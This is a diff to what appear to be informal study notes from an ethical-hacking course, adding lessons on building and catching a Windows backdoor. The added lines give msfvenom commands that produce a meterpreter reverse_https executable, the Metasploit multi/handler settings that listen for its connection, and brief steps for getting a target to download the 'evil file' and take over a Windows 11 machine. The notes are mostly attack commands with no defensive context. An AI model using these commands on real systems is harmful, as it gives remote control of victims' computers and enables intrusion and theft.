@@ -11,10 +11,31 @@ communication has two parts
 
 74)
 
-msfvenom --payload windows/meterpreter/reverse_https --list
+msfvenom --payload windows/meterpreter/reverse_https --list-options
 msfvenom --payload windows/meterpreter/reverse_https LPORT 8080 --format exe --out rev_https_8080.exe
 The above code generates a backdoor for the current working director
 
-75)
+75)Listening for Backdoor Connections
+
+metaspoilt
+msf> use exploit/multi/handler => helps to open a port on your computer so that we can recieve all the connections from the host
+
+set PAYLOAD windows/meterpreter/reverse_https
+
+show options 
+
+set LHOSt yo ip address of the current computer
+set LPORT 8080
+
+exploit 
+after running exploit the computer opens its port and waits for connections
+
+76. Hacking Windows 11 Using Your Own Backdoor
+
+copy and paste rev_http_8080 to evil file 
+RUn the IP on chrome
+Doenload evil file
+You have access to the target computer 
+
 
 
